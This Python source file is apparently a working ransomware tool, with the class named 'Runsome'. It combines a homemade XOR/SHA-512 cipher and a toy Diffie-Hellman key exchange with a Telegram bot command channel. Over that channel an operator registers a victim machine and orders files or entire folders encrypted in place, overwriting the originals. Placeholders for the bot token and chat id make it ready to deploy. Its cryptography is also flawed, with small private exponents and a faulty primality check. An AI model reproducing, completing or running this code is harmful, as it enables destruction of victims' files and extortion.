import os
import random
import requests
from ast import literal_eval
from time import sleep
import gc
import hashlib

class CryptographyAc(object):
    
    class CryptoAc(object):
        
        def __init__(self,key,block=640000):
            if type(key) == bytes:
                self.key = self.rand_the_key(key)
                self.path = self.temp(os.environ['AppData']+os.sep+'CryptographyAc')
                self.ePath = self.path+os.sep+'Encrypt.key'
                self.dPath = self.path+os.sep+'Decrypt.key'
                self.block = block
            else:
                raise TypeError ('Key must to be bytes')

        def temp(self,path):
            try:
                os.mkdir(path)
            except:
                pass
            return path

        def xor(self,a,b):
            return bytes(i^j for i, j in zip(a, b))

        def rand_the_key(self,key):
            return hashlib.sha512(key).digest()

        def spliter(self,data):
            splited=[]
            for i in range(0,len(data),64):
                splited.append(data[i:i+64])
            return splited

        def rand_first_key(self,val,key):
            l=len(val)
            g=l
            c=0
            while l<64+g:
                val+=bytes([val[c]^key[c]])
                l+=1
                c+=1
            return val[g:]

        def decrypt_first_key(self,val,key):
            t = self.xor(val,self.rand_the_key(key))
            k = self.rand_first_key(t,key)[0:1]
            key = self.rand_the_key(key + k)
            return key

        def encrypt(self,data):
            if type(data)!=bytes:
                raise TypeError ('Data must to be bytes')
            key = self.key
            f = open(self.ePath,'wb') 
            first = self.rand_first_key(bytes([data[0]]),key)
            f.write(self.xor(first,self.rand_the_key(key)))
            key = self.rand_the_key(key+bytes([data[0]]))
            for i in range(len(data)//self.block+1):
                for n in self.spliter(data[self.block*i:self.block*i+self.block]):
                    f.write(self.xor(n,key))
                    key = self.rand_the_key(key)
            f.close()
            return [open(self.ePath,'rb').read(), open(self.ePath,'wb').write(b'0')][0]


        def decrypt(self,data):
            if type(data)!=bytes:
                raise TypeError ('Data must to be bytes')
            with open(self.dPath,'wb')as d:
                key = self.decrypt_first_key(data[:64],self.key)
                data = data[64:]
                for i in range(len(data)//self.block+1):
                        for n in self.spliter(data[self.block*i:self.block*i+self.block]):
                            d.write(self.xor(n,key))
                            key = self.rand_the_key(key)
                d.close()
                return [open(self.dPath,'rb').read(), open(self.dPath,'wb').write(b'0')][0]

        def __permmited__(self,path):
            assert (os.path.isfile(path))
            try:
                f=open(path,'ab')
                f.close()
                return True
            except PermissionError as e:
                return False


        def encrypt_file(self,path):
            if self.__permmited__(path):
                clear = open(path, 'rb')
                data = clear.read()
                cipher = open(path,'wb')
                cipher.write(self.encrypt(data))
                return True
            return 'Access is denied'

        def decrypt_file(self,path):
            if self.__permmited__(path):
                cipher=open(path,'rb')
                data=cipher.read()
                clear=open(path,'wb')
                clear.write(self.decrypt(data))
                return True
            return 'Access is denied'
        

        def all_dir_recursive(self,path):

            def get_dir(path):
                f=os.listdir(path)
                res=[]
                if path [-1]!= os.sep:
                    path+=os.sep
                for i in f:
                    if os.path.isdir(path+i):
                        res.append(path+i)
                return res

            f = get_dir(path)
            d=[]
            if len(f)>0:
                for i in f:
                    d.append(i)
                    try:
                        for n in all_dir_recursive(i):
                            d.append(n)
                    except:
                        pass
            return d

        def get_files(self,path):
            assert os.path.isdir(path)
            f=[]
            for i in [path]+self.all_dir_recursive(path):
                try:
                    for n in os.listdir(i):
                        try:
                            if os.path.isfile(i+os.sep+n):
                                f.append(i+os.sep+n)
                        except:
                            pass
                except:
                    pass
            return f
        
        def encrypt_folder(self,path):
            for i in self.get_files(path):
                try:
                    self.encrypt_file(i)
                except:
                    pass
                
        def decrypt_folder(self,path):
            for i in self.get_files(path):
                try:
                    self.decrypt_file(i)
                except:
                    pass
                    
    class Primes(object):

        def __div2__(self,n):
            e = n-1
            m = 0
            while e % 2 == 0:
                e //= 2
                m += 1
            return e, m

        def __iterat__(self, a, e, m, n):
            if pow(a, e, n) == 1:
                return True

            for i in range(m):
                if pow(a,2**i*e,n)==n-1:
                    return True
            return False

        def milerRabin(self,n):
            e, m = self.__div2__(n)
            for i in range(20):
                a = random.randrange(2, n)
                if self.__iterat__(a,e,m,n):
                    continue
                else:
                    return False
            return True

        def __randomBit__(self,n):
            return(random.randrange(2**(n-1)+1, 2**n-1))

        def isprime(self,num):
            primes=[2,3,5]
            if num==0:
                return False
            if num==1:
                return False
            if num in primes:
                return True
            elif num < 5:
                return False

            if num%(num//2)==0:
                return False

            else:
                 for i in range(2,int(num**0.5)+1):
                    if num%i==0:
                        return False
            return True


        def get_prime(self,n):
            primes=[]
            for i in range(1000):
                if self.isprime(i):
                    primes.append(i)
            while True:
                p = self.__randomBit__(n)
                c=0
                for i in primes:
                    if p%i==0:
                        c=1
                        break
                if c==0:
                    if self.milerRabin(p):
                        return p
                    
                    

    class Diffie_Hellman(object):          

        def __publicNum__(self):
            p=CryptographyAc().Primes().get_prime(512)
            g=random.randint(100,1000)                                                      
            return {
                  'p':p,
                  'g':g
            }


        def gen_full_key(self):
            public=self.__publicNum__()
            private=self.gen_private_key()
            public={
                'p':public['p'],'g':public['g'],
                'send':(public['g']**private % public['p'])
            }
            return {
                  'public':public,
                  'private':private
            }

        def gen_private_key(self):
            return random.randint(200,10**4)

        def import_public(self,recv_public,ownPrviate):
            p,g=recv_public['p'],recv_public['g']
            A_B = g**ownPrviate % p
            return {'send':A_B,'p':p}
        
        def gen_first_key(self,key):
            while len(str(key))<65:
                key+=int(str(key)[-2:])*key
            assert (len(str(key))>64)
            nkey=b''
            while len(nkey)<64:
                nkey+=bytes([key%255])
                (key)=int(str(key)[:-1])
            return nkey

        def send_symmetric_key(self,rcvPublic,ownPrivate):
            p,A_B=rcvPublic['p'],rcvPublic['send']
            key = A_B**ownPrivate % p
            return self.gen_first_key(key)
        
        
class Runsome(object):
    
    def __init__(self,telegram_token,chat_id):
        self.crypt=CryptographyAc()
        self.fullKey=self.crypt.Diffie_Hellman().gen_full_key()
        self.public=self.fullKey['public']
        self.private=self.fullKey['private']
        self.telegram_token=telegram_token
        self.chat_id=chat_id
        
    def send_messages(self,message):
        return requests.get("https://api.telegram.org/bot"+self.telegram_token+"/sendMessage?chat_id="+self.chat_id+"&text="+message)
    
    def read_messages(self,offset):
        r = requests.get('https://api.telegram.org/bot'+self.telegram_token+'/getUpdates?offset='+offset)
        con = r.json()['result'][-1]
        offset = con['update_id']
        message = con['message']['text']
        return offset, message
        
    def listen_for_key(self):
        dh = self.crypt.Diffie_Hellman()
        self.send_messages(str(self.public))
        ffo, _ = self.read_messages('0')
        ffo = str(ffo)
        off = ffo
        while True:
            off, m = self.read_messages(off)
            off = str(off)
            if off != ffo:
                rcv = literal_eval(m)
                key = dh.send_symmetric_key(rcv,self.private)
                red = [rcv,self.private,self.public,self.fullKey]
                for i in red:
                    del(i)
                    gc.collect()
                return key
            sleep(3)
    
    def listen(self,uid):
        ffo, _ = self.read_messages('0')
        off = ffo
        while True:
            off,m=self.read_messages(str(off))
            if ffo!=off:
                print(1)
                ffo=off
                if m=='connect '+uid:
                    return True
            sleep(2)
            
    def start(self,uid):
        self.send_messages('New connection,'+uid)
        if self.listen(uid):
            key=self.listen_for_key()
            self.send_messages('connected to '+uid+' !')
            cipher=self.crypt.CryptoAc(key)
            ffo=1
            off=0
            while True:
                off,m=self.read_messages(str(off))
                if off!=ffo:
                    ffo=off
                    if 'encrypt file' in m:
                        path=m[12:].strip()
                        cipher.encrypt_file(path)
                    elif 'encrypt folder' in m:
                        path=m[14:].strip()
                        cipher.encrypt_folder(path)
                sleep(2)

                        
if __name__=='__main__':
    telegram_token = 'Your Telegram bot token'
    chat_id = 'Your group chat id'
    uid = 'Choose a unique id'
    r = Runsome(telegram_token,chat_id)
    r.start(uid)
    
